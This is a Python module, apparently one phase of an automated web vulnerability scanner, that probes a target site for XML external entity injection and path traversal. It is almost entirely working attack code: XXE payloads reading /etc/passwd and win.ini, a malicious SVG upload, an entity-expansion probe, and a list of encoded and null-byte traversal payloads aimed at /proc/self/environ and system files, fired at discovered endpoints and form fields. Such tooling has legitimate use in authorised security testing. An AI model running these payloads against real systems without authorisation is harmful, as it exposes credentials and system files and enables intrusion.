**Phase 20 — XXE Injection & Path Traversal / LFI**

  Tests XML External Entity injection and directory traversal / local file inclusion.
  These are common in file parsers, import features, and REST APIs accepting XML.

  ```python
  import time, json, re
  from urllib.parse import urljoin, quote

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  ALL_FORMS  = _G.get('ALL_FORMS', []) + _G.get('AUTH_FORMS', [])
  AUTH_PARAMS = _G.get('AUTH_PARAMS', [])

  xxe_lfi_findings = []

  # ══════════════════════════════════════════════════════════════
  # PART A — XXE Injection (XML External Entity)
  # ══════════════════════════════════════════════════════════════
  # Find endpoints that accept XML or have XML-related forms
  XXE_PAYLOADS = [
      # Classic XXE — read /etc/passwd
      (
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
          '<root><data>&xxe;</data></root>',
          'Classic XXE /etc/passwd', ['root:x:0:0', '/bin/bash', '/bin/sh']
      ),
      # XXE Windows
      (
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
          '<root><data>&xxe;</data></root>',
          'XXE win.ini', ['[fonts]', '[extensions]', 'for 16-bit']
      ),
      # XXE via parameter entity (bypasses some parsers)
      (
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
          '<!ENTITY callxxe "%xxe;">]><root><data>&callxxe;</data></root>',
          'XXE parameter entity', ['root:x:0:0']
      ),
      # Billion laughs DoS detection (safe — just detect if parsed)
      (
          '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
          '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
          '<root>&lol2;</root>',
          'XML entity expansion (safe probe)', ['lollollol']
      ),
  ]

  # Endpoints to test for XXE
  xxe_endpoints = []
  # 1. Any form with file upload (might accept XML)
  for form in ALL_FORMS:
      if any(f.get('type') == 'file' for f in form.get('fields', [])):
          xxe_endpoints.append(form.get('action', BASE))
  # 2. Known XML-accepting patterns
  XML_PATHS = ['/api/xml', '/import', '/upload', '/parse', '/convert',
               '/api/import', '/api/upload', '/api/parse', '/feed', '/rss',
               '/soap', '/wsdl', '/api/data', '/api/export', '/api/config']
  for path in XML_PATHS:
      xxe_endpoints.append(urljoin(BASE, path))
  # 3. Any API endpoint (might accept XML)
  api_endpoints = [p for p in _G.get('ALL_LINKS', set()) if '/api/' in p]
  xxe_endpoints.extend(api_endpoints[:10])

  print(f"[XXE] Testing {len(xxe_endpoints)} endpoints for XXE injection")

  for endpoint in list(set(xxe_endpoints))[:20]:
      url = endpoint if endpoint.startswith('http') else urljoin(BASE, endpoint)
      for payload, desc, indicators in XXE_PAYLOADS:
          time.sleep(0.3)
          try:
              # Try as raw XML body
              r = session.post(url, data=payload, timeout=10,
                               headers={'Content-Type': 'application/xml'},
                               allow_redirects=True)
              body = r.text
              if any(ind in body for ind in indicators):
                  print(f"  [CRITICAL] XXE ({desc}): {url}")
                  print(f"  Response snippet: {body[:400]}")
                  xxe_lfi_findings.append({
                      'url': url, 'type': 'xxe', 'desc': desc,
                      'payload': payload[:100], 'evidence': body[:300],
                  })
                  break

              # Also try as text/xml
              r2 = session.post(url, data=payload, timeout=10,
                                headers={'Content-Type': 'text/xml'})
              if any(ind in r2.text for ind in indicators):
                  print(f"  [CRITICAL] XXE ({desc}): {url}")
                  xxe_lfi_findings.append({
                      'url': url, 'type': 'xxe', 'desc': desc,
                      'payload': payload[:100], 'evidence': r2.text[:300],
                  })
                  break

              # Try JSON-to-XML switch (Content-Type swap attack)
              r3 = session.post(url, data=payload, timeout=10,
                                headers={'Content-Type': 'application/xml',
                                         'Accept': 'application/json'})
              if any(ind in r3.text for ind in indicators):
                  print(f"  [CRITICAL] XXE via Content-Type swap ({desc}): {url}")
                  xxe_lfi_findings.append({
                      'url': url, 'type': 'xxe-content-swap', 'desc': desc,
                      'payload': payload[:100], 'evidence': r3.text[:300],
                  })
                  break
          except Exception:
              continue

  # ══════════════════════════════════════════════════════════════
  # PART B — SVG/XLSX XXE (file upload forms)
  # ══════════════════════════════════════════════════════════════
  upload_forms = [f for f in ALL_FORMS if any(
      fld.get('type') == 'file' for fld in f.get('fields', [])
  )]

  if upload_forms:
      print(f"\n[XXE] Testing {len(upload_forms)} upload forms for SVG/XML XXE")
      SVG_XXE = ('<?xml version="1.0"?>'
                 '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                 '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
                 '<text x="0" y="20">&xxe;</text></svg>')

      for form in upload_forms[:5]:
          action = form.get('action', BASE)
          url = action if action.startswith('http') else urljoin(BASE, action)
          fields = form.get('fields', [])
          file_field = next((f['name'] for f in fields if f.get('type') == 'file'), None)
          if not file_field:
              continue
          data = {f['name']: f.get('value', '') or 'test' for f in fields
                  if f.get('name') and f.get('type') != 'file'}
          try:
              files = {file_field: ('xxe.svg', SVG_XXE, 'image/svg+xml')}
              r = session.post(url, data=data, files=files, timeout=15)
              if 'root:x:0:0' in r.text or '/bin/bash' in r.text:
                  print(f"  [CRITICAL] SVG XXE accepted: {url}")
                  xxe_lfi_findings.append({
                      'url': url, 'type': 'svg-xxe', 'desc': 'SVG file with XXE entity',
                      'evidence': r.text[:300],
                  })
          except Exception:
              continue

  # ══════════════════════════════════════════════════════════════
  # PART C — Path Traversal / LFI
  # ══════════════════════════════════════════════════════════════
  LFI_PAYLOADS = [
      # Unix
      ('../../../etc/passwd', 'basic traversal', ['root:x:0:0', '/bin/bash']),
      ('....//....//....//etc/passwd', 'double-dot bypass', ['root:x:0:0']),
      ('..%2f..%2f..%2fetc%2fpasswd', 'URL-encoded traversal', ['root:x:0:0']),
      ('..%252f..%252f..%252fetc%252fpasswd', 'double URL-encoded', ['root:x:0:0']),
      ('%2e%2e/%2e%2e/%2e%2e/etc/passwd', 'dot URL-encoded', ['root:x:0:0']),
      ('../../../etc/passwd%00.jpg', 'null byte bypass', ['root:x:0:0']),
      ('....\\....\\....\\etc\\passwd', 'backslash traversal', ['root:x:0:0']),
      ('/etc/passwd', 'absolute path', ['root:x:0:0']),
      # Windows
      ('..\\..\\..\\windows\\win.ini', 'Windows traversal', ['[fonts]', '[extensions]']),
      ('....\\\\....\\\\....\\\\windows\\\\win.ini', 'Windows double-backslash', ['[fonts]']),
      # App-specific
      ('../../../proc/self/environ', 'proc environ', ['PATH=', 'HOME=']),
      ('../../../proc/self/cmdline', 'proc cmdline', ['node', 'python', 'java']),
  ]

  # Find params that look like file/path references
  FILE_KEYWORDS = ['file', 'path', 'page', 'include', 'template', 'view', 'doc',
                   'document', 'folder', 'dir', 'load', 'read', 'resource', 'src',
                   'img', 'image', 'download', 'attachment', 'filename', 'name',
                   'url', 'uri', 'locale', 'lang', 'language', 'module', 'plugin']

  # Collect URL params that might accept file paths
  file_params = []
  for p in AUTH_PARAMS:
      pname = p.get('param', '').lower()
      if any(k in pname for k in FILE_KEYWORDS):
          file_params.append(p)
  # Also check ALL_LINKS for query params
  for link in list(_G.get('ALL_LINKS', set()))[:100]:
      if '?' in link:
          from urllib.parse import parse_qs, urlparse
          parsed = urlparse(link)
          for pname in parse_qs(parsed.query):
              if any(k in pname.lower() for k in FILE_KEYWORDS):
                  file_params.append({'url': link, 'param': pname})

  print(f"\n[LFI] Found {len(file_params)} file-related parameters to test")

  # Get baseline for comparison
  for param_info in file_params[:15]:
      purl = param_info['url'].split('?')[0]
      pname = param_info['param']
      try:
          r_base = session.get(purl, params={pname: 'index'}, timeout=10)
          baseline_len = len(r_base.text)
      except Exception:
          continue

      for payload, desc, indicators in LFI_PAYLOADS:
          time.sleep(0.3)
          try:
              r = session.get(purl, params={pname: payload}, timeout=10)
              if any(ind in r.text for ind in indicators):
                  print(f"  [CRITICAL] Path Traversal ({desc}): {purl} ?{pname}=")
                  print(f"  Evidence: {r.text[:300]}")
                  xxe_lfi_findings.append({
                      'url': purl, 'param': pname, 'type': 'path-traversal',
                      'desc': desc, 'payload': payload, 'evidence': r.text[:300],
                  })
                  break
          except Exception:
              continue

  # Also test forms with text fields
  for form in ALL_FORMS[:15]:
      action = form.get('action', BASE)
      url = action if action.startswith('http') else urljoin(BASE, action)
      fields = form.get('fields', [])
      file_fields = [f for f in fields if f.get('name') and
                     any(k in f['name'].lower() for k in FILE_KEYWORDS)]
      for field in file_fields:
          fname = field['name']
          for payload, desc, indicators in LFI_PAYLOADS[:6]:
              time.sleep(0.3)
              data = {f['name']: f.get('value', '') or 'test' for f in fields if f.get('name')}
              data[fname] = payload
              try:
                  method = form.get('method', 'get').lower()
                  if method == 'post':
                      r = session.post(url, data=data, timeout=10)
                  else:
                      r = session.get(url, params=data, timeout=10)
                  if any(ind in r.text for ind in indicators):
                      print(f"  [CRITICAL] LFI via form ({desc}): {url} field={fname}")
                      xxe_lfi_findings.append({
                          'url': url, 'param': fname, 'type': 'lfi-form',
                          'desc': desc, 'payload': payload, 'evidence': r.text[:300],
                      })
                      break
              except Exception:
                  continue

  # ══════════════════════════════════════════════════════════════
  # PART D — Path Traversal via Direct URL Path
  # ══════════════════════════════════════════════════════════════
  print(f"\n[LFI] Testing direct URL path traversal")
  DIRECT_PATHS = [
      '/..%2f..%2f..%2fetc%2fpasswd',
      '/....//....//....//etc/passwd',
      '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
      '/static/..%2f..%2f..%2fetc%2fpasswd',
      '/assets/..%2f..%2f..%2fetc%2fpasswd',
      '/images/..%2f..%2f..%2fetc%2fpasswd',
  ]
  for path in DIRECT_PATHS:
      time.sleep(0.3)
      url = BASE.rstrip('/') + path
      try:
          r = session.get(url, timeout=10, allow_redirects=False)
          if 'root:x:0:0' in r.text:
              print(f"  [CRITICAL] Direct path traversal: {url}")
              xxe_lfi_findings.append({
                  'url': url, 'type': 'direct-path-traversal',
                  'desc': f'URL path traversal via {path}',
                  'evidence': r.text[:300],
              })
              break
      except Exception:
          continue

  # Summary
  print(f"\n=== XXE / PATH TRAVERSAL SUMMARY: {len(xxe_lfi_findings)} issues found ===")
  for f in xxe_lfi_findings:
      sev = 'CRITICAL'
      print(f"  [{sev}] {f['type']}: {f.get('url','')} — {f.get('desc','')}")
  if xxe_lfi_findings:
      _G.setdefault('FINDINGS', []).extend([
          {'severity': 'CRITICAL',
           'title': f"{f['type'].upper()} — {f.get('desc','')}",
           'url': f.get('url', ''), 'detail': f} for f in xxe_lfi_findings
      ])
  ```
